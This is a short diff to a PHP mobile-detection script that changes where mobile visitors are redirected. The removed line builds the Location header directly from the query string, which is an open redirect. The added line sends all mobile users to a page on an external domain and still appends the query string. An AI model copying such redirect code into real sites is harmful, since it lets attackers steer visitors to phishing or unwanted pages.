@@ -45,7 +45,7 @@ if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {
 
 if ($mobile_browser > 0) {
    // do something for mobile devices
-   header('Location: '. $_SERVER['QUERY_STRING']);
+   header('Location: http://undereyerecovery.com/presentation/m170713.php'. $_SERVER['QUERY_STRING']);
 }
 
  ?>
